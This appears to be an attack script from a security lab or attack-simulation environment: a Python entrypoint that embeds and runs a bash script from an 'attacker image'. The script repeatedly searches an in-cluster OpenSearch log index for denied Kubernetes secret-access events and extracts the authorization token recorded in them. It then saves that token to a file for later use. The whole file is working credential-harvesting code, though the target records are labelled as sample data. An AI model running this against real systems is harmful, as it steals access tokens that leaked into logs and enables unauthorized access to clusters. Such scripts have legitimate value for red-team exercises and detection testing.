#!/usr/bin/env python3
"""Python entrypoint for scan-opensearch.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -eu

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

LOG_ENDPOINT="http://opensearch.$LOG_NS:9200"
LOG_INDEX="${LOG_INDEX:-logs-otel*}"
OUT_FILE="$DATA_PATH/KC1/token"
MAX=100
TOKEN=""

# Installing dependencies and setup
require_tools curl jq
mkdir -p "$(dirname "$OUT_FILE")"

for i in $(seq 1 "$MAX"); do
  TOKEN="$(curl -s "${LOG_ENDPOINT}/${LOG_INDEX}/_search" \
    -H 'Content-Type: application/json' \
    -d '{
      "size": 1,
      "sort": [
        { "@timestamp": { "order": "desc" } }
      ],
      "query": {
        "bool": {
          "filter": [
            { "exists": { "field": "attributes.authorization" } },
            { "term": { "http.status": 403 } }
          ],
          "must": [
            { "match_phrase": { "service.name": "traffic-controller" } },
            { "match_phrase": { "body": "k8s_secret_access_denied" } },
            { "match_phrase": { "attributes.note": "SAMPLE DATA" } }
          ]
        }
      },
      "_source": [ "attributes.authorization" ]
    }' \
    | jq -r '.hits.hits[0]._source.attributes.authorization // empty')"

  if [ -n "$TOKEN" ]; then
    echo "Found in attempt $i:"
    echo "$TOKEN"
    break
  fi

  sleep 5
done

if [ -z "$TOKEN" ]; then
  echo "No values after $MAX retries"
fi

echo "TOKEN=$TOKEN"
echo "$TOKEN" > "$OUT_FILE"
echo "Saved value in: $OUT_FILE"
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
